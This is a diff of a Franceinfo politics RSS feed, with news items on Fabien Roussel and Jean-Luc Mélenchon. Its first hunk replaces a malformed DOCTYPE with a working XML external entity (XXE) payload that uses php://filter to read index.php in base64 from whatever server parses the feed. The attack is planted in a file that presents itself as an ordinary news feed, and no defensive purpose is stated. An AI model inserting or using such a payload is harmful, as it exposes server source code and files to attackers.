@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE replace [<!ENTITY xxe "SYSTEM "php://filter/read=convert.base64-encode/resource=index"> ]>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"> ]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Franceinfo - XD - Toute l'actualité politique en France</title>
@@ -17,7 +17,7 @@
       <enclosure type="image/jpeg" length="19465" url="https://www.francetvinfo.fr/image/7611jcwsn-8c7e/600/337/26480112.png"/>
     </item>
     <item>
-      <title>ENQUÊTE. Fabien Roussel accusé d'emploi fictif : sa défense mise à mal par des syndicalistes</title>
+      <title>ENQUÊTE. Fabien Roussel accusé d'emploi fictif : sa défense mise à mal par des syndicalistes</title>
       <description><![CDATA[Fabien Roussel se défend d'avoir bénéficié d'un emploi fictif en tant qu'assistant parlementaire expliquant avoir réalisé&nbsp;un&nbsp;"travail de terrain" avec ceux qui manifestaient contre des fermetures d'usine. Le problème est que les responsables syndicaux des sites en question ne se souviennent pas du tout l'avoir vu.]]></description>
       <pubDate>Thu, 24 Feb 2022 07:43:53 +0100</pubDate>
       <link>https://www.francetvinfo.fr/politique/parti-communiste-francais/enquete-fabien-roussel-accuse-d-emploi-fictif-sa-defense-mise-a-mal-par-des-syndicalistes_4977744.html#xtor=RSS-3-[politique]</link>
@@ -98,7 +98,7 @@
       <enclosure type="image/jpeg" length="17385" url="https://www.francetvinfo.fr/image/7611iptop-07d2/500/281/26471688.jpg"/>
     </item>
     <item>
-      <title>VIDEO. Crise en Ukraine : le point de vue de Jean-Luc Mélenchon</title>
+      <title>VIDEO. Crise en Ukraine : le point de vue de Jean-Luc Mélenchon</title>
       <description><![CDATA[Il est contre les sanctions, et il souhaite sortir de l'OTAN, voici ce qu'a déclaré le candidat de la présidentielle 2022, Jean-Luc Mélenchon, sur la crise entre l'Ukraine et la Russie.]]></description>
       <pubDate>Wed, 23 Feb 2022 13:59:18 +0100</pubDate>
       <link>https://www.francetvinfo.fr/monde/europe/manifestations-en-ukraine/video-crise-en-ukraine-le-point-de-vue-de-jean-luc-melenchon_4977276.html#xtor=RSS-3-[politique]</link>
